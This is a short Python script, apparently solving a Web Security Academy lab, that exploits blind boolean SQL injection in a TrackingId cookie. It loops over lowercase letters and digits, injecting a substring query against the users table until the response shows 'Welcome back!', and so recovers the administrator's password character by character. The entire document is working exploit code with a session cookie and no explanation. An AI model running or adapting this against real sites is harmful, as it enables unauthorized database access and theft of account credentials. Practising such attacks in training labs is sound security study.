import requests

url = "https://0a02002003b095f180300804001a00e7.web-security-academy.net/filter"

params = {
    "category": "Accessories"
}


headers = {
    "User-Agent": "Mozilla/5.0",
    "Referer": "https://0a02002003b095f180300804001a00e7.web-security-academy.net/"
}

carac_list=[chr(x) for x in range(97,123)]
carac_list+=[str(i) for i in range(0,10)]
cracked_password=""
for j in range(1, 21):
    for i in carac_list:
        cookies = {
            "TrackingId": "JsWipToajZ8pRY0v'+and+(select+substring(password, " + str(j) + ", 1)+from+users+where+username='administrator')+=+'" + i + "'--",
            "session": "s21IEYIYd0hbpTAF0o6IOiWo3nV7iSAc"
        }
        response = requests.get(
            url,
            params=params,
            cookies=cookies,
            headers=headers
        )
        if ("Welcome back!" in response.text):
            print(str(j) + "." + i + " SUCCEED")
            cracked_password += i
            break
        else:
            print(str(j) + "." + i + " FAILED")

print(cracked_password)

# print("Status:", response.status_code)
# print(response.text)
# 2m39